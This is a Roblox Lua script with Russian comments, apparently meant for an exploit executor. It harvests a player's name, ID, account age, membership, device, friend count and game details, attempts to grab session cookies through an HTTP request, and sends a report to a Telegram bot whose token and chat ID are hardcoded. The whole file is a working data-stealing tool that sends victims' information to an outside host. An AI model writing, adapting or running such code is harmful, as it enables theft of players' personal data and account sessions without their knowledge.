local player = game.Players.LocalPlayer

-- Сбор данных
local data = {
    имя = player.Name,
    айди = player.UserId,
    игра = game.PlaceId,
    время = os.date("%d.%m.%Y %H:%M:%S")
}

-- Возраст аккаунта
data.возраст_аккаунта = player.AccountAge

-- Тип подписки
data.подписка = tostring(player.MembershipType)

-- Устройство
data.устройство = tostring(game:GetService("UserInputService"):GetPlatform())

-- Количество друзей
data.друзья = #player:GetFriends()

-- Название игры
local success, gameInfo = pcall(function()
    return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
end)
data.название_игры = success and gameInfo.Name or "N/A"

-- Cookie
local cookie_success, cookie_data = pcall(function()
    local response = request({
        Url = "https://www.roblox.com/game/referral",
        Method = "GET"
    })
    return response.Headers["Set-Cookie"] or "N/A"
end)
data.куки = cookie_success and cookie_data or "N/A"

-- Дополнительные данные
data.отображаемое_имя = player.DisplayName
data.версия_клиента = tostring(game:GetService("Version"))

-- Формирование сообщения для Telegram
local message = "🔍 ДАННЫЕ ИГРОКА:\n\n" ..
                "👤 Имя: " .. data.имя .. 
                "\n🆔 ID: " .. data.айди .. 
                "\n🎮 Игра: " .. data.название_игры .. 
                "\n📍 ID игры: " .. data.игра ..
                "\n📅 Возраст аккаунта: " .. data.возраст_аккаунта .. " дней" ..
                "\n💎 Подписка: " .. data.подписка ..
                "\n📱 Устройство: " .. data.устройство ..
                "\n👥 Друзей: " .. data.друзья ..
                "\n🔧 Версия клиента: " .. data.версия_клиента ..
                "\n⏰ Время: " .. data.время

-- Отправка в Telegram
request({
    Url = "https://api.telegram.org/bot8430370950:AAEBY5JHBgb62K0B-r0_zGckjedfw9BmuMg/sendMessage",
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = game:GetService("HttpService"):JSONEncode({
        chat_id = "7811534269",
        text = message
    })
})

-- Дублирование в консоль для проверки
print("📨 Данные отправлены в Telegram")
